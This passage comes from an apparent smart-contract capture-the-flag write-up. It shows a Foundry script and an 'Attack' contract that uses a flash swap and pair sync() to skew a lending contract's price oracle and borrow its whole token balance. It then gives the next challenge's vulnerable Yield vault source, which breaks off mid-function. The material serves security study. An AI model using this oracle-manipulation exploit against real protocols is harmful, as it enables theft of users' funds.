</span><span>        (</span><span style=color:#0086b3>uint112</span><span> _reserve0, </span><span style=color:#0086b3>uint112</span><span> _reserve1, </span><span style=color:#0086b3>uint32</span><span> _blockTimestampLast) </span><span style=color:#a71d5d;font-weight:700>=</span><span> pair.</span><span style=color:#62a35c>getReserves</span><span>();
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Pair reserve0 : "</span><span>, _reserve0);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Pair reserve1 : "</span><span>, _reserve1);
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Lending balance of collatoralToken : "</span><span>, collateralToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(lending)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Lending balance of borrowToken : "</span><span>, borrowToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(lending)));
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance of collatoralToken : "</span><span>, collateralToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(player)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance of borrowToken : "</span><span>, borrowToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(player)));
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"price of borrowToken in terms of collatoralTokens : "</span><span>, lending.</span><span style=color:#62a35c>getExchangeRate</span><span>());
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player : "</span><span>, player);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance: "</span><span>, player.balance);
</span><span>
</span><span>        Attack attack </span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#62a35c>Attack</span><span>(</span><span style=color:#0086b3>address</span><span>(lending), player);
</span><span>        attack.</span><span style=color:#62a35c>exploit</span><span>();
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Pair balance of collatoralToken : "</span><span>, collateralToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(pair)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Pair balance of borrowToken : "</span><span>, borrowToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(pair)));
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Lending balance of collatoralToken : "</span><span>, collateralToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(lending)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Lending balance of borrowToken : "</span><span>, borrowToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(lending)));
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance of collatoralToken : "</span><span>, collateralToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(player)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance of borrowToken : "</span><span>, borrowToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(player)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"isSolved() : "</span><span>, lending.</span><span style=color:#62a35c>isSolved</span><span>());
</span><span>        vm.</span><span style=color:#62a35c>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>interface </span><span style=color:#62a35c>IUniswapV2Callee </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>uniswapV2Call</span><span>(</span><span style=color:#0086b3>address </span><span>sender, </span><span style=color:#0086b3>uint </span><span>amount0, </span><span style=color:#0086b3>uint </span><span>amount1, </span><span style=color:#0086b3>bytes </span><span style=color:#a71d5d;font-weight:700>calldata </span><span>data) </span><span style=color:#a71d5d;font-weight:700>external</span><span>;
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Attack </span><span style=color:#a71d5d;font-weight:700>is </span><span style=color:#62a35c>IUniswapV2Callee </span><span>{
</span><span>    Lending </span><span style=color:#a71d5d;font-weight:700>public </span><span>lending;
</span><span>    Pair </span><span style=color:#a71d5d;font-weight:700>public </span><span>pair;
</span><span>    </span><span style=color:#0086b3>ERC20 </span><span style=color:#a71d5d;font-weight:700>public</span><span> collateralToken;
</span><span>    </span><span style=color:#0086b3>ERC20 </span><span style=color:#a71d5d;font-weight:700>public</span><span> borrowToken;
</span><span>    </span><span style=color:#0086b3>address</span><span> player;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>address </span><span>_lending, </span><span style=color:#0086b3>address </span><span>_player) {
</span><span>        lending </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Lending</span><span>(_lending);
</span><span>        pair </span><span style=color:#a71d5d;font-weight:700>=</span><span>  lending.</span><span style=color:#62a35c>pair</span><span>();
</span><span>        collateralToken </span><span style=color:#a71d5d;font-weight:700>=</span><span> lending.</span><span style=color:#62a35c>collateralToken</span><span>();
</span><span>        borrowToken </span><span style=color:#a71d5d;font-weight:700>=</span><span> lending.</span><span style=color:#62a35c>borrowToken</span><span>();
</span><span>        player </span><span style=color:#a71d5d;font-weight:700>=</span><span> _player;
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#a71d5d;font-weight:700>public </span><span>{
</span><span>        </span><span style=color:#0086b3>uint256</span><span> totalBorrowableBorrowTokenFromPair </span><span style=color:#a71d5d;font-weight:700>=</span><span> borrowToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(pair)) </span><span style=color:#a71d5d;font-weight:700>-</span><span> 1;
</span><span>        pair.</span><span style=color:#62a35c>swap</span><span>(0, totalBorrowableBorrowTokenFromPair, </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), </span><span style=color:#a71d5d;font-weight:700>abi</span><span>.</span><span style=color:#a71d5d;font-weight:700>encodePacked</span><span>(</span><span style=color:#183691>"something"</span><span>));
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>uniswapV2Call</span><span>(</span><span style=color:#0086b3>address </span><span>sender, </span><span style=color:#0086b3>uint </span><span>amount0, </span><span style=color:#0086b3>uint </span><span>amount1, </span><span style=color:#0086b3>bytes </span><span style=color:#a71d5d;font-weight:700>calldata </span><span>data) </span><span style=color:#a71d5d;font-weight:700>public </span><span>{
</span><span>        </span><span style=color:#0086b3>uint256</span><span> totalBorrowableBorrowTokenFromLending </span><span style=color:#a71d5d;font-weight:700>=</span><span> borrowToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(lending));
</span><span>        pair.</span><span style=color:#62a35c>sync</span><span>();
</span><span>        lending.</span><span style=color:#62a35c>borrow</span><span>(totalBorrowableBorrowTokenFromLending);
</span><span>        </span><span style=color:#0086b3>uint256</span><span> borrowedTokensFromLending </span><span style=color:#a71d5d;font-weight:700>=</span><span> borrowToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)));
</span><span>        borrowToken.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#0086b3>address</span><span>(pair), borrowedTokensFromLending);
</span><span>    }
</span><span>}
</span></code></pre></div></div><hr><h1 id=yeild>Yeild</h1><p>P: "UniswapV3 yield farming is so easy! Just make sure there is liquidity around the spot price. You are given 5e18 each of token0 and token1. Your goal is to get 15e18 of LP tokens."<div class=note-container><button class=note-toggle><div class=note-icon><p>Yield.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: Unlicense
</span><span>
</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.7.0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@openzeppelin-contracts-3.4.2/contracts/math/Math.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@uniswap/v3-core/contracts/libraries/FullMath.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@openzeppelin-contracts-3.4.2/contracts/utils/ReentrancyGuard.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3MintCallback.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@uniswap/v3-core/contracts/libraries/TickMath.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@uniswap/v3-periphery/contracts/libraries/LiquidityAmounts.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@uniswap/v3-periphery/contracts/libraries/PositionKey.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@openzeppelin-contracts-3.4.2/contracts/token/ERC20/ERC20.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Yield </span><span style=color:#a71d5d;font-weight:700>is
</span><span>    </span><span style=color:#62a35c>IUniswapV3MintCallback</span><span>,
</span><span>    </span><span style=color:#62a35c>IUniswapV3SwapCallback</span><span>,
</span><span>    </span><span style=color:#a71d5d;font-weight:700>ERC20</span><span>,
</span><span>    </span><span style=color:#62a35c>ReentrancyGuard
</span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>Deposit</span><span>(
</span><span>        </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>sender,
</span><span>        </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>to,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>shares,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount0,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount1
</span><span>    );
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>Withdraw</span><span>(
</span><span>        </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>sender,
</span><span>        </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>to,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>shares,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount0,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount1
</span><span>    );
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>CollectFees</span><span>(
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>feesToVault0,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>feesToVault1,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>feesToProtocol0,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>feesToProtocol1
</span><span>    );
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>Snapshot</span><span>(</span><span style=color:#0086b3>int24 </span><span>tick, </span><span style=color:#0086b3>uint256 </span><span>totalAmount0, </span><span style=color:#0086b3>uint256 </span><span>totalAmount1, </span><span style=color:#0086b3>uint256 </span><span>totalSupply);
</span><span>
</span><span>    IUniswapV3Pool </span><span style=color:#a71d5d;font-weight:700>public immutable </span><span>pool;
</span><span>    </span><span style=color:#0086b3>IERC20 </span><span style=color:#a71d5d;font-weight:700>public immutable</span><span> token0;
</span><span>    </span><span style=color:#0086b3>IERC20 </span><span style=color:#a71d5d;font-weight:700>public immutable</span><span> token1;
</span><span>    </span><span style=color:#0086b3>int24 </span><span style=color:#a71d5d;font-weight:700>public immutable</span><span> tickSpacing;
</span><span>
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public</span><span> protocolFee;
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public</span><span> maxTotalSupply;
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> governance;
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> pendingGovernance;
</span><span>
</span><span>    </span><span style=color:#0086b3>int24 </span><span style=color:#a71d5d;font-weight:700>public</span><span> lastTick;
</span><span>    </span><span style=color:#0086b3>int24 </span><span style=color:#a71d5d;font-weight:700>public</span><span> baseLower;
</span><span>    </span><span style=color:#0086b3>int24 </span><span style=color:#a71d5d;font-weight:700>public</span><span> baseUpper;
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public</span><span> accruedProtocolFees0;
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public</span><span> accruedProtocolFees1;
</span><span>
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> player;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(
</span><span>        </span><span style=color:#0086b3>address </span><span>_player,
</span><span>        </span><span style=color:#0086b3>address </span><span>_pool,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>_protocolFee,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>_maxTotalSupply
</span><span>    ) </span><span style=color:#62a35c>ERC20</span><span>(</span><span style=color:#183691>"Yield Vault"</span><span>, </span><span style=color:#183691>"YV"</span><span>) {
</span><span>        player </span><span style=color:#a71d5d;font-weight:700>=</span><span> _player;
</span><span>        pool </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>IUniswapV3Pool</span><span>(_pool);
</span><span>        token0 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>ERC20</span><span>(</span><span style=color:#62a35c>IUniswapV3Pool</span><span>(_pool).</span><span style=color:#62a35c>token0</span><span>());
</span><span>        token1 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>ERC20</span><span>(</span><span style=color:#62a35c>IUniswapV3Pool</span><span>(_pool).</span><span style=color:#62a35c>token1</span><span>());
</span><span>        tickSpacing </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>IUniswapV3Pool</span><span>(_pool).</span><span style=color:#62a35c>tickSpacing</span><span>();
</span><span>
</span><span>        protocolFee </span><span style=color:#a71d5d;font-weight:700>=</span><span> _protocolFee;
</span><span>        maxTotalSupply </span><span style=color:#a71d5d;font-weight:700>=</span><span> _maxTotalSupply;
</span><span>        governance </span><span style=color:#a71d5d;font-weight:700>= msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>;
</span><span>        lastTick </span><span style=color:#a71d5d;font-weight:700>= type</span><span>(</span><span style=color:#0086b3>int24</span><span>).</span><span style=color:#a71d5d;font-weight:700>max</span><span>;
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(_protocolFee </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span> 1e6, </span><span style=color:#183691>"protocolFee"</span><span>);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isSolved</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>bool</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#62a35c>balanceOf</span><span>(player) </span><span style=color:#a71d5d;font-weight:700>>= </span><span style=color:#0086b3>15 ether</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>deposit</span><span>(
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount0Desired,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount1Desired,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount0Min,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount1Min,
</span><span>        </span><span style=color:#0086b3>address </span><span>to
</span><span>    )
</span><span>        </span><span style=color:#a71d5d;font-weight:700>external
</span><span>        </span><span style=color:#a71d5d;font-weight:700>nonReentrant
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(
</span><span>            </span><span style=color:#0086b3>uint256</span><span> shares,
</span><span>            </span><span style=color:#0086b3>uint256</span><span> amount0,
</span><span>            </span><span style=color:#0086b3>uint256</span><span> amount1
</span><span>        )
</span><span>    {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(amount0Desired </span><span style=color:#a71d5d;font-weight:700>></span><span> 0 </span><span style=color:#a71d5d;font-weight:700>||</span><span> amount1Desired </span><span style=color:#a71d5d;font-weight:700>></span><span> 0, </span><span style=color:#183691>"amount0Desired or amount1Desired"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(to </span><span style=color:#a71d5d;font-weight:700>!= </span><span style=color:#0086b3>address</span><span>(0) </span><span style=color:#a71d5d;font-weight:700>&&</span><span> to </span><span style=color:#a71d5d;font-weight:700>!= </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), </span><span style=color:#183691>"to"</span><span>);
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Poke positions so vault's current holdings are up-to-date
</span><span>        </span><span style=color:#62a35c>_poke</span><span>(baseLower, baseUpper);
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Calculate amounts proportional to vault's holdings
</span><span>        (shares, amount0, amount1) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>_calcSharesAndAmounts</span><span>(amount0Desired, amount1Desired);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(shares </span><span style=color:#a71d5d;font-weight:700>></span><span> 0, </span><span style=color:#183691>"shares"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(amount0 </span><span style=color:#a71d5d;font-weight:700>>=</span><span> amount0Min, </span><span style=color:#183691>"amount0Min"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(amount1 </span><span style=color:#a71d5d;font-weight:700>>=</span><span> amount1Min, </span><span style=color:#183691>"amount1Min"</span><span>);
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Pull in tokens from sender
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(amount0 </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) token0.</span><span style=color:#62a35c>transferFrom</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), amount0);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(amount1 </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) token1.</span><span style=color:#62a35c>transferFrom</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), amount1);
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Mint shares to recipient
</span><span>        </span><span style=color:#62a35c>_mint</span><span>(to, shares);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>Deposit</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, to, shares, amount0, amount1);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#62a35c>totalSupply</span><span>() </span><span style=color:#a71d5d;font-weight:700>&lt;=</span><span> maxTotalSupply, </span><span style=color:#183691>"maxTotalSupply"</span><span>);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_poke</span><span>(</span><span style=color:#0086b3>int24 </span><span>tickLower, </span><span style=color:#0086b3>int24 </span><span>tickUpper) </span><span style=color:#a71d5d;font-weight:700>internal </span><span>{
</span><span>        (</span><span style=color:#0086b3>uint128</span><span> liquidity, , , , ) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>_position</span><span>(tickLower, tickUpper);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(liquidity </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) {
</span><span>            pool.</span><span style=color:#62a35c>burn</span><span>(tickLower, tickUpper, 0);
</span><span>        }
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_calcSharesAndAmounts</span><span>(</span><span style=color:#0086b3>uint256 </span><span>amount0Desired, </span><span style=color:#0086b3>uint256 </span><span>amount1Desired)
</span><span>        </span><span style=color:#a71d5d;font-weight:700>internal
</span><span>        </span><span style=color:#a71d5d;font-weight:700>view
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(
</span><span>            </span><span style=color:#0086b3>uint256</span><span> shares,
</span><span>            </span><span style=color:#0086b3>uint256</span><span> amount0,
</span><span>            </span><span style=color:#0086b3>uint256</span><span> amount1
</span><span>        )
</span><span>    {
</span><span>        (</span><span style=color:#0086b3>uint256</span><span> total0, </span><span style=color:#0086b3>uint256</span><span> total1) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getTotalAmounts</span><span>();
</span><span>        
</span><span>        </span><span style=color:#969896;font-style:italic>// If total supply > 0, vault can't be empty
</span><span>        </span><span style=color:#a71d5d;font-weight:700>assert</span><span>(</span><span style=color:#62a35c>totalSupply</span><span>() </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0 </span><span style=color:#a71d5d;font-weight:700>||</span><span> total0 </span><span style=color:#a71d5d;font-weight:700>></span><span> 0 </span><span style=color:#a71d5d;font-weight:700>||</span><span> total1 </span><span style=color:#a71d5d;font-weight:700>></span><span> 0);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#62a35c>totalSupply</span><span>() </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) {
</span><span>            </span><span style=color:#969896;font-style:italic>// For first deposit, just use the amounts desired
</span><span>            amount0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> amount0Desired;
</span><span>            amount1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> amount1Desired;
</span><span>            shares </span><span style=color:#a71d5d;font-weight:700>=</span><span> Math.</span><span style=color:#62a35c>max</span><span>(amount0, amount1);
</span><span>        } </span><span style=color:#a71d5d;font-weight:700>else if </span><span>(total0 </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) {
</span><span>            amount1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> amount1Desired;
</span><span>            shares </span><span style=color:#a71d5d;font-weight:700>=</span><span> FullMath.</span><span style=color:#62a35c>mulDiv</span><span>(amount1, </span><span style=color:#62a35c>totalSupply</span><span>(), total1);
</span><span>        } </span><span style=color:#a71d5d;font-weight:700>else if </span><span>(total1 </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) {
</span><span>            amount0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> amount0Desired;
</span><span>            shares </span><span style=color:#a71d5d;font-weight:700>=</span><span> FullMath.</span><span style=color:#62a35c>mulDiv</span><span>(amount0, </span><span style=color:#62a35c>totalSupply</span><span>(), total0);
</span><span>        } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>            </span><span style=color:#0086b3>uint256</span><span> cross </span><span style=color:#a71d5d;font-weight:700>=</span><span> Math.</span><span style=color:#62a35c>min</span><span>(amount0Desired </span><span style=color:#a71d5d;font-weight:700>*</span><span> total1, amount1Desired </span><span style=color:#a71d5d;font-weight:700>*</span><span> total0);
</span><span>            </span><span style=color:#a71d5d;font-weight:700>require</span><span>(cross </span><span style=color:#a71d5d;font-weight:700>></span><span> 0, </span><span style=color:#183691>"cross"</span><span>);
</span><span>
</span><span>            </span><span style=color:#969896;font-style:italic>// Round up amounts
</span><span>            amount0 </span><span style=color:#a71d5d;font-weight:700>= </span><span>(cross </span><span style=color:#a71d5d;font-weight:700>-</span><span> 1) </span><span style=color:#a71d5d;font-weight:700>/</span><span> total1 </span><span style=color:#a71d5d;font-weight:700>+</span><span> 1;
</span><span>            amount1 </span><span style=color:#a71d5d;font-weight:700>= </span><span>(cross </span><span style=color:#a71d5d;font-weight:700>-</span><span> 1) </span><span style=color:#a71d5d;font-weight:700>/</span><span> total0 </span><span style=color:#a71d5d;font-weight:700>+</span><span> 1;
</span><span>            shares </span><span style=color:#a71d5d;font-weight:700>=</span><span> cross </span><span style=color:#a71d5d;font-weight:700>* </span><span style=color:#62a35c>totalSupply</span><span>() </span><span style=color:#a71d5d;font-weight:700>/</span><span> total0 </span><span style=color:#a71d5d;font-weight:700>/</span><span> total1;
</span><span>        }
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>withdraw</span><span>(
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>shares,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount0Min,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount1Min,
</span><span>        </span><span style=color:#0086b3>address </span><span>to
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>external nonReentrant returns </span><span>(</span><span style=color:#0086b3>uint256</span><span> amount0, </span><span style=color:#0086b3>uint256</span><span> amount1) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(shares </span><span style=color:#a71d5d;font-weight:700>></span><span> 0, </span><span style=color:#183691>"shares"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(to </span><span style=color:#a71d5d;font-weight:700>!= </span><span style=color:#0086b3>address</span><span>(0) </span><span style=color:#a71d5d;font-weight:700>&&</span><span> to </span><span style=color:#a71d5d;font-weight:700>!= </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), </span><span style=color:#183691>"to"</span><span>);
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Burn shares
</span><span>        </span><span style=color:#62a35c>_burn</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, shares);
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Calculate token amounts proportional to unused balances
</span><span>        </span><span style=color:#0086b3>uint256</span><span> unusedAmount0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> FullMath.</span><span style=color:#62a35c>mulDiv</span><span>(</span><span style=color:#62a35c>getBalance0</span><span>(), shares, </span><span style=color:#62a35c>totalSupply</span><span>());
</span><span>        </span><span style=color:#0086b3>uint256</span><span> unusedAmount1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> FullMath.</span><span style=color:#62a35c>mulDiv</span><span>(</span><span style=color:#62a35c>getBalance1</span><span>(), shares, </span><span style=color:#62a35c>totalSupply</span><span>());
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Withdraw proportion of liquidity from Uniswap pool
</span><span>        (</span><span style=color:#0086b3>uint256</span><span> baseAmount0, </span><span style=color:#0086b3>uint256</span><span> baseAmount1) </span><span style=color:#a71d5d;font-weight:700>=
</span><span>            </span><span style=color:#62a35c>_burnLiquidityShare</span><span>(baseLower, baseUpper, shares, </span><span style=color:#62a35c>totalSupply</span><span>());
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Sum up total amounts owed to recipient
</span><span>        amount0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> unusedAmount0 </span><span style=color:#a71d5d;font-weight:700>+</span><span> baseAmount0;
</span><span>        amount1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> unusedAmount1 </span><span style=color:#a71d5d;font-weight:700>+</span><span> baseAmount1;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(amount0 </span><span style=color:#a71d5d;font-weight:700>>=</span><span> amount0Min, </span><span style=color:#183691>"amount0Min"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(amount1 </span><span style=color:#a71d5d;font-weight:700>>=</span><span> amount1Min, </span><span style=color:#183691>"amount1Min"</span><span>);
</span><span>
